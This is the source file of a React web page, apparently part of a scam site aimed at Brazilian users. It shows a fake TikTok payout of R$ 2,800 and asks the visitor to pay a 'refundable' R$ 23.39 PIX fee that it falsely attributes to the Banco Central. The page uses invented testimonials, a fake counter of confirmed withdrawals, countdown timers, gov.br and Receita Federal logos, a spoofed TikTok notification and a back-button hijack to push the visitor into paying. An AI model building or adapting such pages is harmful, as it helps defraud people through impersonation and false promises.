import { createFileRoute, Link } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useState } from "react";
import { ChevronLeft, Clock, Lock, Copy, Loader2 } from "lucide-react";
import { createPixTransaction } from "@/lib/cyberhub.functions";
import coinP from "@/assets/coin-p.png";
import govbr from "@/assets/govbr-logo.webp";
import receita from "@/assets/receita-federal.webp";
import lucasImg from "@/assets/testimonial-lucas.webp";
import amandaImg from "@/assets/testimonial-amanda.webp";
import carlaImg from "@/assets/testimonial-carla.webp";
import rafaelImg from "@/assets/testimonial-rafael.webp";
import sp1 from "@/assets/social-proof-1.webp";
import sp2 from "@/assets/social-proof-2.webp";
import sp3 from "@/assets/social-proof-3.webp";
import sp4 from "@/assets/social-proof-4.webp";

export const Route = createFileRoute("/confirmar-saque")({
  component: ConfirmarSaque,
});

const TESTIMONIALS = [
  {
    img: lucasImg,
    name: "Lucas M.",
    value: "R$ 5.361,52 ✓",
    text: "paguei achando q era cilada kkk mas o reembolso veio antes do saque",
    where: "São Paulo · há 12 min",
  },
  {
    img: amandaImg,
    name: "Amanda S.",
    value: "R$ 1.450 ✓",
    text: "gente eu tava morrendo de medo mas fiz e caiu certinho",
    where: "Rio de Janeiro · há 28 min",
  },
  {
    img: rafaelImg,
    name: "Rafael O.",
    value: "R$ 3.200 ✓",
    text: "terceira vez sacando ja, toda vez cai em menos de 2 min",
    where: "Belo Horizonte · há 43 min",
  },
  {
    img: carlaImg,
    name: "Carla F.",
    value: "R$ 980 ✓",
    text: "quase nao fiz por causa da taxa mas devolveram tao rapido",
    where: "Curitiba · há 1h",
  },
];

const FALLBACK_PIX =
  "00020101021226820014br.gov.bcb.pix2560qrcode.a55scd.com.br/v1/54fe3206-7e6a-46b8-bd06-5a996e7870f52040000530398658025802BR5914AJUDASOLIDARIA6008SAOPAULO62070503***6304A1B2";

function ConfirmarSaque() {
  const [seconds, setSeconds] = useState(6 * 60 + 17);
  const [showPix, setShowPix] = useState(false);
  const [pixSeconds, setPixSeconds] = useState(10 * 60);
  const [showToast, setShowToast] = useState(false);
  const [copied, setCopied] = useState(false);
  const [pixCode, setPixCode] = useState<string>("");
  const [pixQrImage, setPixQrImage] = useState<string>("");
  const [pixLoading, setPixLoading] = useState(false);
  const [pixError, setPixError] = useState<string | null>(null);

  const createPix = useServerFn(createPixTransaction);

  useEffect(() => {
    const id = setInterval(
      () => setSeconds((s) => (s > 0 ? s - 1 : 0)),
      1000,
    );
    return () => clearInterval(id);
  }, []);

  // Back-button intercept → redireciona para oferta de back-redirect
  useEffect(() => {
    window.history.pushState({ br: true }, "");
    const onPop = () => {
      window.location.href = "/back-redirect";
    };
    window.addEventListener("popstate", onPop);
    return () => window.removeEventListener("popstate", onPop);
  }, []);

  useEffect(() => {
    if (!showPix) return;
    const id = setInterval(
      () => setPixSeconds((s) => (s > 0 ? s - 1 : 0)),
      1000,
    );
    return () => clearInterval(id);
  }, [showPix]);

  const openPix = async () => {
    setShowPix(true);
    setShowToast(true);
    window.setTimeout(() => setShowToast(false), 6000);

    if (pixCode || pixLoading) return;
    setPixLoading(true);
    setPixError(null);
    try {
      const res = await createPix({
        data: {
          amount: 2339, // R$ 23,39 em centavos
          customerName: "Cliente TikTok",
          customerPhone: "11999999999",
          customerDocument: "12345678909",
          customerEmail: "cliente@tiktok.com",
          description: "Taxa de liberação de saque",
        },
      });
      if (res.ok && res.pixCode) {
        setPixCode(res.pixCode);
        setPixQrImage(res.qrImage || "");
      } else {
        setPixError(res.ok ? "Resposta inválida do gateway" : res.error);
        setPixCode(FALLBACK_PIX);
      }
    } catch (e) {
      console.error(e);
      setPixError("Falha ao gerar PIX");
      setPixCode(FALLBACK_PIX);
    } finally {
      setPixLoading(false);
    }
  };

  const copyCode = async () => {
    if (!pixCode) return;
    try {
      await navigator.clipboard.writeText(pixCode);
    } catch {
      // ignore
    }
    setCopied(true);
    window.setTimeout(() => setCopied(false), 2000);
  };

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");
  const pixMm = String(Math.floor(pixSeconds / 60)).padStart(2, "0");
  const pixSs = String(pixSeconds % 60).padStart(2, "0");

  const qrUrl = pixQrImage
    ? pixQrImage
    : pixCode
      ? `https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=0&data=${encodeURIComponent(pixCode)}`
      : "";

  return (
    <div className="min-h-screen bg-[#f5f5f5] max-w-[430px] mx-auto pb-10">
      {/* Header */}
      <header className="flex items-center px-3 py-4 bg-background relative">
        <Link to="/resgatar" className="w-9 h-9 flex items-center justify-center">
          <ChevronLeft size={26} className="text-foreground" strokeWidth={2.5} />
        </Link>
        <h1 className="absolute left-1/2 -translate-x-1/2 text-[16px] font-bold text-foreground">
          Confirmação de saque
        </h1>
        <div className="w-9" />
      </header>

      {/* Timer */}
      <div className="flex items-center justify-center gap-2 py-2.5 bg-pink/10 text-pink text-[13px] font-bold">
        <Clock size={14} />
        <span className="text-foreground/70 font-medium">Tempo restante:</span>
        <span className="tabular-nums text-pink">{mm}:{ss}</span>
      </div>

      <div className="px-4 pt-4 space-y-4">
        {/* Balance card */}
        <div className="bg-[#0d0d0d] rounded-[18px] p-5 pb-4 relative overflow-hidden">
          <p className="text-white/80 text-[13px] font-medium">Saldo disponível</p>
          <p className="text-white text-[34px] font-[900] leading-tight mt-0.5 tabular-nums">
            R$ 2.800,00
          </p>
          <img
            src={coinP}
            alt=""
            className="absolute right-4 top-1/2 -translate-y-1/2 w-[78px] h-[78px] object-contain"
          />
          <div className="border-t border-dashed border-white/30 mt-4" />
          <p className="text-white/70 text-[12px] mt-3">Suas transações: R$ 0,03</p>
        </div>

        {/* Contribuição de segurança */}
        <div className="bg-white rounded-[18px] p-5 shadow-sm">
          <p className="text-foreground/70 text-[13px] font-medium">
            Contribuição de segurança
          </p>
          <div className="flex items-center justify-between mt-1.5">
            <span className="text-foreground text-[26px] font-extrabold tabular-nums">
              R$ 23,39
            </span>
            <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 px-2 py-1 rounded-full">
              100% REEMBOLSÁVEL
            </span>
          </div>
          <p className="text-foreground/60 text-[12.5px] leading-snug mt-3">
            Contribuição de segurança exigida pelo Banco Central para liberação
            do saque de{" "}
            <strong className="text-foreground">R$ 2.800,00</strong>. O valor de{" "}
            <strong className="text-foreground">R$ 23,39</strong> será devolvido
            integralmente na sua chave Pix em 1 minuto.
          </p>

          <div className="mt-4 bg-[#fafafa] rounded-[12px] p-3.5">
            <p className="text-foreground/60 text-[11px] font-bold uppercase tracking-wide">
              Composição da taxa
            </p>
            <div className="flex items-center justify-between mt-2.5 text-[13px]">
              <span className="text-foreground/70">Validação BCB</span>
              <span className="text-foreground font-medium">R$ 21,90</span>
            </div>
            <div className="flex items-center justify-between mt-1.5 text-[13px]">
              <span className="text-foreground/70">Seguro antifraude</span>
              <span className="text-foreground font-medium">R$ 15,91</span>
            </div>
            <div className="flex items-center justify-between mt-2 pt-2 border-t border-[#eee] text-[13px]">
              <span className="text-foreground font-bold">Total (reembolsável)</span>
              <span className="text-foreground font-bold">R$ 23,39</span>
            </div>
          </div>
        </div>

        {/* Steps */}
        <div className="bg-white rounded-[18px] p-5 shadow-sm">
          <div className="flex items-start justify-between relative">
            {[
              { n: 1, t: "Pagar", s: "R$ 23,39" },
              { n: 2, t: "Reembolso", s: "em 1 min" },
              { n: 3, t: "R$ 2.800,00", s: "na conta" },
            ].map((step, i) => (
              <div
                key={step.n}
                className="flex-1 flex flex-col items-center text-center relative"
              >
                {i < 2 && (
                  <div className="absolute top-4 left-1/2 w-full h-0.5 bg-[#eee] -z-0" />
                )}
                <div
                  className={`relative z-10 w-8 h-8 rounded-full flex items-center justify-center text-[13px] font-bold ${
                    step.n === 1
                      ? "bg-pink text-white"
                      : "bg-[#eee] text-foreground/60"
                  }`}
                >
                  {step.n}
                </div>
                <p className="text-foreground text-[12px] font-bold mt-2">
                  {step.t}
                </p>
                <p className="text-foreground/60 text-[11px]">{step.s}</p>
              </div>
            ))}
          </div>
        </div>

        {/* CTA */}
        <button
          onClick={openPix}
          className="w-full h-[54px] bg-pink text-white font-extrabold text-[14px] rounded-[12px] flex items-center justify-center gap-2 shadow-lg shadow-pink/30 active:scale-[0.98] transition-transform"
        >
          <Lock size={17} />
          CONFIRMAR E LIBERAR R$ 2.800,00
        </button>

        {/* Dados para reembolso */}
        <div className="bg-white rounded-[18px] p-5 shadow-sm">
          <p className="text-foreground/70 text-[13px] font-bold">
            Dados para reembolso
          </p>
          {[
            { l: "Data", v: "26/05/2026" },
            { l: "Chave PIX", v: "E-mail" },
            { l: "Valor a receber", v: "R$ 2.800,00" },
          ].map((row) => (
            <div
              key={row.l}
              className="flex items-center justify-between py-3 border-b border-[#eee] last:border-b-0 text-[13px]"
            >
              <span className="text-foreground/60">{row.l}</span>
              <span className="text-foreground font-bold">{row.v}</span>
            </div>
          ))}
        </div>

        {/* Testimonials */}
        <div className="bg-white rounded-[18px] p-5 shadow-sm">
          <p className="text-foreground text-[14px] font-extrabold">
            Quem já sacou hoje
          </p>

          <div className="mt-3 space-y-4">
            {TESTIMONIALS.map((t) => (
              <div key={t.name} className="flex gap-3">
                <img
                  src={t.img}
                  alt={t.name}
                  className="w-11 h-11 rounded-full object-cover flex-shrink-0"
                />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center justify-between gap-2">
                    <span className="text-foreground text-[13px] font-bold truncate">
                      {t.name}
                    </span>
                    <span className="text-emerald-600 text-[12px] font-bold whitespace-nowrap">
                      {t.value}
                    </span>
                  </div>
                  <p className="text-foreground/70 text-[12.5px] leading-snug mt-0.5">
                    "{t.text}"
                  </p>
                  <p className="text-foreground/40 text-[11px] mt-1">{t.where}</p>
                </div>
              </div>
            ))}
          </div>

          <div className="flex items-center gap-3 mt-5 pt-4 border-t border-[#eee]">
            <div className="flex -space-x-2">
              {[sp1, sp2, sp3, sp4].map((src, i) => (
                <img
                  key={i}
                  src={src}
                  alt=""
                  className="w-7 h-7 rounded-full border-2 border-white object-cover"
                />
              ))}
            </div>
            <span className="text-foreground/70 text-[12px] font-medium">
              +8.432 saques confirmados hoje
            </span>
          </div>
        </div>

        {/* Authority logos */}
        <div className="flex items-center justify-center gap-6 py-2 opacity-80">
          <img src={govbr} alt="gov.br" className="h-6 object-contain" />
          <img
            src={receita}
            alt="Receita Federal"
            className="h-9 object-contain"
          />
        </div>

        {/* Footer info */}
        <div className="text-center space-y-1 pb-4">
          <p className="text-foreground/60 text-[12px] font-bold">
            Processo 100% seguro
          </p>
          <p className="text-foreground/40 text-[11px]">
            Protocolo TT-2026-LYO03P
          </p>
          <p className="text-pink text-[12px] font-medium underline underline-offset-2">
            Precisa de ajuda?
          </p>
        </div>
      </div>

      {/* TikTok-style notification toast */}
      <div
        className={`fixed top-0 left-1/2 -translate-x-1/2 w-full max-w-[430px] z-[120] px-3 pt-3 transition-all duration-500 ${
          showToast ? "translate-y-0 opacity-100" : "-translate-y-full opacity-0"
        }`}
      >
        <div className="bg-[#1a1a1a]/95 backdrop-blur-md text-white rounded-[14px] p-3.5 flex gap-3 shadow-2xl">
          <div className="w-10 h-10 rounded-[8px] bg-black flex items-center justify-center flex-shrink-0">
            <svg viewBox="0 0 24 24" className="w-6 h-6" fill="none">
              <path
                d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5.8 20.1a6.34 6.34 0 0 0 10.86-4.43V8.69a8.16 8.16 0 0 0 4.77 1.52V6.77a4.85 4.85 0 0 1-1.84-.08z"
                fill="#fff"
              />
              <path
                d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-1.45c.38 2.14 1.65 3.97 3.42 5.05v-.36z"
                fill="#25F4EE"
              />
              <path
                d="M9.45 12.77a2.89 2.89 0 0 0-1.34 5.46 2.88 2.88 0 0 1-.59-1.75 2.89 2.89 0 0 1 2.89-2.89c.3 0 .59.05.88.13v-3.5a6.85 6.85 0 0 0-1-.05h-.16v2.74c-.22-.08-.45-.13-.68-.14z"
                fill="#FE2C55"
              />
            </svg>
          </div>
          <div className="flex-1 min-w-0">
            <div className="flex items-center justify-between">
              <p className="text-[13px] font-semibold">
                TikTok <span className="text-white/50 font-normal">· agora</span>
              </p>
            </div>
            <p className="text-[13px] font-bold mt-0.5">Transferência pendente</p>
            <p className="text-[12px] text-white/80 leading-snug mt-0.5">
              Transferência pendente de R$ 2.800,00 aguardando pagamento da
              taxa de liberação.
            </p>
          </div>
        </div>
      </div>

      {/* PIX modal */}
      {showPix && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center px-5 bg-black/70 backdrop-blur-sm">
          <div className="w-full max-w-[360px] bg-[#1c1c1c] rounded-[20px] p-6 text-white">
            <p className="text-center text-[12px] font-bold tracking-[0.18em] text-white/80">
              PAGUE COM PIX
            </p>

            <div className="mt-5 bg-white p-3 rounded-[14px] mx-auto w-[230px] h-[230px] flex items-center justify-center">
              {pixLoading || !qrUrl ? (
                <Loader2 size={36} className="animate-spin text-pink" />
              ) : (
                <img
                  src={qrUrl}
                  alt="QR Code PIX"
                  width={210}
                  height={210}
                  className="w-full h-full object-contain"
                />
              )}
            </div>

            {pixError && (
              <p className="text-center text-red-300 text-[11px] mt-3">
                {pixError} — usando código de demonstração
              </p>
            )}

            <p className="text-center text-white/70 text-[12px] mt-4">
              Escaneie o QR Code ou copie o código abaixo:
            </p>

            <div className="mt-3 bg-black/40 border border-white/10 rounded-[10px] p-3 min-h-[52px]">
              <p className="text-white/80 text-[11px] leading-snug break-all font-mono">
                {pixLoading && !pixCode ? "Gerando código PIX..." : pixCode}
              </p>
            </div>

            <button
              onClick={copyCode}
              className="w-full h-[48px] mt-4 bg-pink text-white font-extrabold text-[14px] rounded-[12px] flex items-center justify-center gap-2 active:scale-[0.98] transition-transform"
            >
              <Copy size={16} />
              {copied ? "Código copiado!" : "Copiar código PIX"}
            </button>

            <p className="text-center text-pink text-[13px] font-bold mt-3 tabular-nums">
              Expira em: {pixMm}:{pixSs}
            </p>

            <div className="flex items-center justify-center gap-2 mt-3 text-white/70 text-[12px]">
              <Loader2 size={14} className="animate-spin text-pink" />
              <span>Aguardando confirmação...</span>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
